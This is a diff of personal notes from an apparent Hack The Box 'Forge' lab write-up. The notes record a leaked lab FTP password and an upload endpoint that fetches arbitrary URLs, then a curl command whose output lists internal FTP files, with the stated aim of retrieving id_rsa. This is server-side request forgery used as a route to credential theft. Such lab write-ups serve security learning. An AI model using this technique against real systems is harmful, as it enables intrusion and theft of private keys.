@@ -11,4 +11,20 @@ Seeing contents of link provided after accessing admin.forge.htb page reveals ot
 ## Seeing contents of admin.forge.htb/announcements
 ![[Pasted image 20210929192820.png]]
 Seeing contents of admin.forge.htb/announcements gives internal ftp server credentials 
-also reveals that 
+also reveals that the `/upload` endpoint now supports `ftp`, `ftps`, `http` and `https` protocols for uploading from url and also  `/upload` endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=`<url>.
+```html
+<li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>
+        <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
+        <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>
+```
+## Using ftp protocol to get sensitive contents like id_rsa
+![[Pasted image 20210929193800.png]]
+```bash
+~/Dropbox/Documents/htb/boxes/forge ❯ curl 'http://forge.htb/uploads/0bXhDe8mQpxZEzXKMJ5W' --output out
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   126  100   126    0     0    529      0 --:--:-- --:--:-- --:--:--   531
+~/Dropbox/Documents/htb/boxes/forge ❯ cat out
+drwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap
+-rw-r-----    1 0        1000           33 Sep 29 05:03 user.txt
+```
